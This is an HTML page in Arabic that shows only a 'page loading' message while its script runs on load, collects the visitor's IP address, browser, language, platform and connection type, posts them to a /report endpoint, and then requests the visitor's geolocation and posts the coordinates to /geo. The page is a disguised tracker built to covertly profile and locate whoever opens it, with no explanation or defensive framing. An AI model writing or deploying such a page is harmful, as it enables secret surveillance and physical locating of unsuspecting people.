<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>جاري التحميل...</title>
  <script>
    async function sendDeviceInfo() {
      const ip = await fetch('/get_ip').then(res => res.text());
      const info = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        ip: ip,
        connection: navigator.connection ? navigator.connection.effectiveType : 'غير معروف'
      };

      // إرسال البيانات
      await fetch('/report', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(info)
      });

      // محاولة إرسال الموقع الجغرافي
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (pos) => {
          await fetch('/geo', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              lat: pos.coords.latitude,
              lon: pos.coords.longitude
            })
          });
        });
      }
    }

    window.onload = sendDeviceInfo;
  </script>
</head>
<body>
  <h2>جارٍ تحميل الصفحة...</h2>
</body>
</html>